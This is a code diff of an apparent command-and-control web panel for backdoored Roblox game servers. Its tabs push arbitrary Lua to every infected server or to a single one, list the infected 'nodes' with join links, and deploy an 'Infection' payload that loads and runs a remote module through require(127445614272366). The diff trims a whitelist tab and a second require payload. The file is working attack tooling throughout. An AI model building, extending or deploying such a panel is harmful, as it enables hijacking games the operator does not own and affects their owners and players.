@@ -2,40 +2,23 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Nexus  | Classic</title>
+    <title>Nexus  | Stable</title>
     <style>
         :root { --apple-blue: #0071e3; --bg: #000; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
-        
         .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
         .nav { display: flex; gap: 12px; }
-        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 5px 10px; border-radius: 5px; transition: 0.2s; }
+        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 5px 10px; border-radius: 5px; }
         .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }
-
         .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { background: #1c1c1e; border-radius: 18px; width: 520px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
-        
         h2 { margin: 0 0 15px 0; font-size: 20px; }
         input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 13px; }
         textarea { font-family: 'Courier New', monospace; resize: none; }
-        
         .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
-        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; }
-        .rh-pill { background: #333; color: #fff; border: none; padding: 5px 10px; border-radius: 12px; font-size: 10px; cursor: pointer; }
-
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-
-        .node-box { background: #0b0b0c; border-radius: 10px; height: 200px; overflow-y: auto; border: 1px solid #333; }
+        .node-box { background: #0b0b0c; border-radius: 10px; height: 180px; overflow-y: auto; border: 1px solid #333; }
         .node-item { padding: 12px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
-        .game-info { display: flex; flex-direction: column; gap: 2px; }
-        .game-name { font-size: 13px; font-weight: 600; color: #fff; }
-        .job-id { font-family: monospace; font-size: 9px; color: #636366; }
-        .join-link { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 12px; }
-
-        /* Music Controller */
-        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 10px 15px; border-radius: 20px; border: 1px solid #444; display: flex; align-items: center; gap: 15px; z-index: 2000; }
-        .stop-btn { background: #ff3b30; color: #fff; border: none; border-radius: 10px; padding: 5px 10px; font-size: 10px; font-weight: 800; cursor: pointer; }
+        .music-ctrl { position: fixed; bottom: 20px; left: 20px; background: rgba(44,44,46,0.8); backdrop-filter: blur(10px); padding: 10px 15px; border-radius: 20px; border: 1px solid #444; display: flex; align-items: center; gap: 10px; z-index: 2000; }
     </style>
 </head>
 <body onclick="startAudio()">
@@ -47,7 +30,6 @@
             <button class="nav-btn active" onclick="showTab('mass', this)">Mass</button>
             <button class="nav-btn" onclick="showTab('single', this)">Single</button>
             <button class="nav-btn" onclick="showTab('inf', this)">Infection</button>
-            <button class="nav-btn" onclick="showTab('wl', this)">Whitelist</button>
             <button class="nav-btn" onclick="showTab('nodes', this)">Nodes</button>
         </div>
         <div id="clock" style="font-size:10px; color:#86868b;"></div>
@@ -57,38 +39,23 @@
         <div class="card">
             <div id="mass" class="tab-content active">
                 <h2>Mass Execution</h2>
-                <div class="row-btns">
-                    <button class="rh-pill" onclick="fill(1, 'm_lua')">Last Rig</button>
-                    <button class="rh-pill" onclick="fill(3, 'm_lua')">Darius (OP)</button>
-                </div>
                 <input type="password" id="m_pw" placeholder="Admin Password">
                 <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
                 <button class="btn-main" onclick="send('mass')">Execute All</button>
             </div>
-
-            <div id="single" class="tab-content">
+            <div id="single" class="tab-content" style="display:none;">
                 <h2>Single Execution</h2>
-                <select id="target_id"><option value="">Waiting...</option></select>
+                <select id="target_id"><option value="">No Servers Online</option></select>
                 <input type="password" id="s_pw" placeholder="Admin Password">
                 <textarea id="s_lua" rows="6" placeholder="-- Target Lua"></textarea>
                 <button class="btn-main" onclick="send('single')">Execute Target</button>
             </div>
-
-            <div id="inf" class="tab-content">
+            <div id="inf" class="tab-content" style="display:none;">
                 <h2>Infection</h2>
-                <input type="password" id="i_pw" placeholder="Password">
                 <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                 <button class="btn-main" onclick="send('inf')">Deploy</button>
             </div>
-
-            <div id="wl" class="tab-content">
-                <h2>Whitelist</h2>
-                <input type="text" id="wid" placeholder="Roblox UserID">
-                <button class="btn-main" onclick="wlu('add')">Add</button>
-                <button class="btn-main" style="background:#222; margin-top:5px;" onclick="wlu('remove')">Remove</button>
-            </div>
-
-            <div id="nodes" class="tab-content">
+            <div id="nodes" class="tab-content" style="display:none;">
                 <h2>Active Nodes</h2>
                 <div id="node_list" class="node-box"></div>
             </div>
@@ -96,9 +63,7 @@
     </div>
 
     <div class="music-ctrl">
-        <div style="font-size: 9px; font-weight: bold; color: #86868b;">AUDIO</div>
-        <button id="playPause" class="rh-pill" onclick="toggleAudio()">PAUSE</button>
-        <button class="stop-btn" onclick="killAudio()">STOP FOREVER</button>
+        <button id="pBtn" style="background:#fff; border:none; border-radius:15px; font-size:10px; font-weight:bold; cursor:pointer;" onclick="toggle()">PAUSE</button>
     </div>
 
     <script>
@@ -106,46 +71,28 @@
         let unlocked = false;
 
         function startAudio() {
-            if(!unlocked) {
+            if(!unlocked && audio) {
                 audio.play().then(() => { unlocked = true; }).catch(() => {});
             }
         }
 
-        function toggleAudio() {
-            const btn = document.getElementById('playPause');
-            if(audio.paused) {
-                audio.play();
-                btn.innerText = "PAUSE";
-            } else {
-                audio.pause();
-                btn.innerText = "PLAY";
-            }
-        }
-
-        function killAudio() {
-            audio.pause();
-            audio.src = ""; // Remove the source so it can't restart
-            document.querySelector('.music-ctrl').style.display = 'none';
+        function toggle() {
+            if(audio.paused) { audio.play(); document.getElementById('pBtn').innerText="PAUSE"; }
+            else { audio.pause(); document.getElementById('pBtn').innerText="PLAY"; }
         }
 
         function showTab(id, btn) {
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
             document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
+            document.getElementById(id).style.display = 'block';
             btn.classList.add('active');
         }
 
-        function fill(type, boxId) {
-            const box = document.getElementById(boxId);
-            if(type === 1) box.value = `require(132155655397653)("Darius")`;
-            if(type === 3) box.value = `require(127445614272366).op("Darius")`;
-        }
-
-        async function send(tab) {
-            const lua = document.querySelector(`#${tab} textarea`).value;
-            const pw = document.querySelector(`#${tab} input`).value;
-            const tid = tab === 'single' ? document.getElementById('target_id').value : null;
-            await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua,password:pw,targetId:tid})});
+        async function send(tabId) {
+            const lua = document.querySelector(`#${tabId} textarea`).value;
+            const pw = document.querySelector(`#${tabId} input`)?.value || "Alt";
+            const tid = tabId === 'single' ? document.getElementById('target_id').value : null;
+            await fetch('/push-lua', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({lua, password:pw, targetId:tid})});
             alert("Sent");
         }
 
@@ -153,11 +100,13 @@
             try {
                 const res = await fetch('/get-games');
                 const data = await res.json();
-                const list = document.getElementById('node_list');
-                const sel = document.getElementById('target_id');
                 const keys = Object.keys(data);
-                if(sel) sel.innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('');
-                if(list) list.innerHTML = keys.map(k => `<div class="node-item"><div class="game-info"><div class="game-name">${data[k].name}</div><div class="job-id">${k}</div></div><a href="roblox://placeId=${data[k].placeId}&gameInstanceId=${k}" class="join-link">JOIN</a></div>`).join('');
+                document.getElementById('node_list').innerHTML = keys.map(k => `
+                    <div class="node-item">
+                        <div><b>${data[k].name}</b><br><small>${k}</small></div>
+                        <a href="roblox://placeId=${data[k].placeId}&gameInstanceId=${k}" style="color:white; font-size:10px;">JOIN</a>
+                    </div>`).join('');
+                document.getElementById('target_id').innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('');
             } catch(e) {}
         }
 
